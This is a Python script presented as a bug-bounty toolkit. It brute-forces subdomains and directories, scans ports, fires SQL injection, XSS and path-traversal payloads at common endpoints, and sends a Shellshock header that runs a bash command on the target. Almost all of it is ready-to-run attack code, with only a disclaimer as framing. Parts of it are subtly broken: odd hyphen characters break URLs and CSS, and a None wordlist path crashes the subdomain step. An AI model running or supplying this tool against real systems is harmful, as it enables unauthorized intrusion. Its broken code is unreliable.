#!/usr/bin/env python3
"""
XploitBountyHunter v2.0
Multi‑Phase Bug Bounty & Penetration Testing Toolkit
Author: ZinXploit
License: UNLICENSED (For authorized penetration testing only)
Warning: Use only on systems you own or have explicit permission to test.
"""

import sys
import os
import socket
import requests
import subprocess
import json
import time
import threading
from queue import Queue
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import dns.resolver
import ipaddress
import argparse
import re
import hashlib
import ssl
import csv
from datetime import datetime

# ───── COLOR & FORMATTING ─────
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ───── MODULE 1: RECON & ENUMERATION ─────
class ReconEngine:
    def __init__(self, target):
        self.target = target
        self.results = {
            'subdomains': [],
            'ips': [],
            'open_ports': [],
            'technologies': [],
            'directories': [],
            'sensitive_files': []
        }
    
    def subdomain_enum(self, wordlist_path='subdomains.txt'):
        print(f"{Colors.CYAN}[+] Enumerating subdomains for {self.target}{Colors.END}")
        if not os.path.exists(wordlist_path):
            # Default wordlist embedded
            default_subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'secure', 'portal']
            for sub in default_subs:
                domain = f"{sub}.{self.target}"
                try:
                    ip = socket.gethostbyname(domain)
                    self.results['subdomains'].append(domain)
                    self.results['ips'].append(ip)
                    print(f"{Colors.GREEN}   Found: {domain} -> {ip}{Colors.END}")
                except socket.gaierror:
                    pass
        else:
            with open(wordlist_path, 'r') as f:
                for line in f:
                    sub = line.strip()
                    if sub:
                        domain = f"{sub}.{self.target}"
                        try:
                            ip = socket.gethostbyname(domain)
                            self.results['subdomains'].append(domain)
                            self.results['ips'].append(ip)
                            print(f"{Colors.GREEN}   Found: {domain} -> {ip}{Colors.END}")
                        except:
                            pass
    
    def port_scan(self, ports='1-1000'):
        print(f"{Colors.CYAN}[+] Scanning ports on {self.target}{Colors.END}")
        open_ports = []
        for port in range(1, 1001):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                open_ports.append(port)
                try:
                    service = socket.getservbyport(port)
                except:
                    service = 'unknown'
                print(f"{Colors.GREEN}   Port {port} ({service}) is open{Colors.END}")
            sock.close()
        self.results['open_ports'] = open_ports
    
    def web_tech_detect(self):
        print(f"{Colors.CYAN}[+] Detecting web technologies{Colors.END}")
        url = f"http://{self.target}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            server = resp.headers.get('Server', '')
            powered = resp.headers.get('X-Powered-By', '')
            if server:
                self.results['technologies'].append(f"Server: {server}")
                print(f"{Colors.GREEN}   Server: {server}{Colors.END}")
            if powered:
                self.results['technologies'].append(f"Powered-By: {powered}")
                print(f"{Colors.GREEN}   X-Powered-By: {powered}{Colors.END}")
            
            # Check common frameworks via content
            if 'wp-content' in resp.text:
                self.results['technologies'].append('WordPress')
                print(f"{Colors.GREEN}   WordPress detected{Colors.END}")
            if 'laravel' in resp.text.lower():
                self.results['technologies'].append('Laravel')
                print(f"{Colors.GREEN}   Laravel detected{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}   Web detection failed: {e}{Colors.END}")
    
    def dir_bruteforce(self, wordlist_path='dirs.txt'):
        print(f"{Colors.CYAN}[+] Bruteforcing directories{Colors.END}")
        url = f"http://{self.target}"
        if not os.path.exists(wordlist_path):
            dirs = ['admin', 'login', 'wp-admin', 'dashboard', 'api', 'backup', 'config', 'test', 'secret']
        else:
            with open(wordlist_path, 'r') as f:
                dirs = [line.strip() for line in f if line.strip()]
        
        for d in dirs:
            target_url = urljoin(url, d)
            try:
                resp = requests.get(target_url, timeout=3)
                if resp.status_code == 200:
                    self.results['directories'].append(target_url)
                    print(f"{Colors.GREEN}   Found: {target_url}{Colors.END}")
                elif resp.status_code == 403:
                    print(f"{Colors.YELLOW}   Forbidden: {target_url}{Colors.END}")
            except:
                pass

# ───── MODULE 2: VULNERABILITY SCANNER ─────
class VulnScanner:
    def __init__(self, target):
        self.target = target
        self.vulns = []
    
    def check_sqli(self, url):
        payloads = ["'", "' OR '1'='1", "' UNION SELECT null--", "admin'--"]
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                resp = requests.get(test_url, timeout=3)
                if 'error' in resp.text.lower() or 'sql' in resp.text.lower():
                    self.vulns.append(('SQL Injection', test_url))
                    return True
            except:
                pass
        return False
    
    def check_xss(self, url):
        payload = "<script>alert('XSS')</script>"
        test_url = f"{url}?q={payload}"
        try:
            resp = requests.get(test_url, timeout=3)
            if payload in resp.text:
                self.vulns.append(('XSS', test_url))
                return True
        except:
            pass
        return False
    
    def check_lfi(self, url):
        payloads = ["../../../../etc/passwd", "....//....//etc/passwd"]
        for payload in payloads:
            test_url = f"{url}?page={payload}"
            try:
                resp = requests.get(test_url, timeout=3)
                if 'root:' in resp.text:
                    self.vulns.append(('LFI', test_url))
                    return True
            except:
                pass
        return False
    
    def scan_all(self):
        print(f"{Colors.CYAN}[+] Running vulnerability checks{Colors.END}")
        base_url = f"http://{self.target}"
        
        # Test on a sample endpoint
        test_endpoints = ['', '/index.php', '/search.php', '/view.php']
        for ep in test_endpoints:
            url = base_url + ep
            self.check_sqli(url)
            self.check_xss(url)
            self.check_lfi(url)
        
        for vuln, location in self.vulns:
            print(f"{Colors.RED}   VULN: {vuln} at {location}{Colors.END}")

# ───── MODULE 3: AUTO‑EXPLOIT (DEMO) ─────
class AutoExploit:
    def __init__(self, target, port):
        self.target = target
        self.port = port
    
    def exploit_shellshock(self):
        print(f"{Colors.PURPLE}[*] Attempting Shellshock exploit{Colors.END}")
        # This is a demo‑only exploit template
        headers = {
            'User-Agent': '() { :;}; echo; echo; /bin/bash -c "id"'
        }
        try:
            resp = requests.get(f"http://{self.target}:{self.port}/cgi-bin/test.cgi", headers=headers, timeout=5)
            if 'uid=' in resp.text:
                print(f"{Colors.RED}   Shellshock successful!{Colors.END}")
                return True
        except:
            pass
        return False
    
    def exploit_wordpress(self):
        print(f"{Colors.PURPLE}[*] Checking WordPress exploits{Colors.END}")
        # Check for known vulnerable plugins
        plugins = ['revslider', 'formidable', 'wp‑seo']
        for plugin in plugins:
            url = f"http://{self.target}/wp‑content/plugins/{plugin}/readme.txt"
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code == 200:
                    print(f"{Colors.YELLOW}   Plugin {plugin} found{Colors.END}")
            except:
                pass

# ───── MODULE 4: REPORT GENERATOR ─────
class ReportGenerator:
    def __init__(self, target, recon_results, vuln_results):
        self.target = target
        self.recon = recon_results
        self.vulns = vuln_results
        self.timestamp = datetime.now().strftime("%Y‑%m‑%d_%H‑%M‑%S")
    
    def generate_html(self):
        filename = f"report_{self.target}_{self.timestamp}.html"
        with open(filename, 'w') as f:
            f.write(f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Penetration Test Report - {self.target}</title>
                <style>
                    body {{ font‑family: Arial, sans‑serif; margin: 40px; }}
                    h1 {{ color: #333; }}
                    .vuln {{ color: red; font‑weight: bold; }}
                    .info {{ color: blue; }}
                    .found {{ color: green; }}
                    table {{ border‑collapse: collapse; width: 100%; }}
                    th, td {{ border: 1px solid #ddd; padding: 8px; }}
                    th {{ background‑color: #f2f2f2; }}
                </style>
            </head>
            <body>
                <h1>XploitBountyHunter Report</h1>
                <h2>Target: {self.target}</h2>
                <p>Generated: {self.timestamp}</p>
                
                <h3>Reconnaissance Results</h3>
                <ul>
                    <li>Subdomains found: {len(self.recon['subdomains'])}</li>
                    <li>Open ports: {self.recon['open_ports']}</li>
                    <li>Technologies: {', '.join(self.recon['technologies'])}</li>
                </ul>
                
                <h3>Vulnerabilities Found</h3>
                <table>
                    <tr><th>Type</th><th>Location</th></tr>
            """)
            for vuln, loc in self.vulns:
                f.write(f'<tr><td class="vuln">{vuln}</td><td>{loc}</td></tr>\n')
            f.write("""
                </table>
                <hr>
                <p>Report generated by <b>ZinXploit-Gpt Toolkit</b></p>
            </body>
            </html>
            """)
        print(f"{Colors.GREEN}[+] HTML report saved as {filename}{Colors.END}")
    
    def generate_txt(self):
        filename = f"report_{self.target}_{self.timestamp}.txt"
        with open(filename, 'w') as f:
            f.write(f"XploitBountyHunter Report\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Date: {self.timestamp}\n")
            f.write("\n=== RECON RESULTS ===\n")
            for key, val in self.recon.items():
                f.write(f"{key}: {val}\n")
            f.write("\n=== VULNERABILITIES ===\n")
            for vuln, loc in self.vulns:
                f.write(f"{vuln}: {loc}\n")
        print(f"{Colors.GREEN}[+] Text report saved as {filename}{Colors.END}")

# ───── MAIN CONTROLLER ─────
def main():
    parser = argparse.ArgumentParser(description='XploitBountyHunter - Bug Bounty Toolkit')
    parser.add_argument('-t', '--target', required=True, help='Target domain or IP')
    parser.add_argument('-p', '--ports', default='1-1000', help='Port range to scan')
    parser.add_argument('-w', '--wordlist', help='Path to wordlist for subdomain/dir brute')
    parser.add_argument('-o', '--output', choices=['html', 'txt', 'both'], default='both', help='Report format')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slower)')
    args = parser.parse_args()

    print(f"""
{Colors.BOLD}{Colors.RED}
╔══════════════════════════════════════════════════════════════╗
║                XploitBountyHunter v2.0                       ║
║           Advanced Bug Bounty & Exploitation Toolkit         ║
║                     by ZinXploit                             ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
Target: {args.target}
Mode: {'Stealth' if args.stealth else 'Aggressive'}
    """)

    # Phase 1: Recon
    recon = ReconEngine(args.target)
    recon.subdomain_enum(args.wordlist if args.wordlist else None)
    recon.port_scan(args.ports)
    recon.web_tech_detect()
    recon.dir_bruteforce()

    # Phase 2: Vulnerability Scan
    scanner = VulnScanner(args.target)
    scanner.scan_all()

    # Phase 3: Auto‑Exploit (demo)
    if recon.results['open_ports']:
        exploit = AutoExploit(args.target, recon.results['open_ports'][0])
        exploit.exploit_shellshock()
        if 'WordPress' in recon.results['technologies']:
            exploit.exploit_wordpress()

    # Phase 4: Reporting
    report = ReportGenerator(args.target, recon.results, scanner.vulns)
    if args.output in ['html', 'both']:
        report.generate_html()
    if args.output in ['txt', 'both']:
        report.generate_txt()

    print(f"""
{Colors.BOLD}{Colors.GREEN}
[+] Scan completed.
[+] Vulnerabilities found: {len(scanner.vulns)}
[+] Reports generated.
{Colors.END}
{Colors.RED}
⚠  WARNING: This tool is for authorized testing only.
   Misuse may violate laws. The author is not responsible.
{Colors.END}
    """)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user.{Colors.END}")
        sys.exit(0)
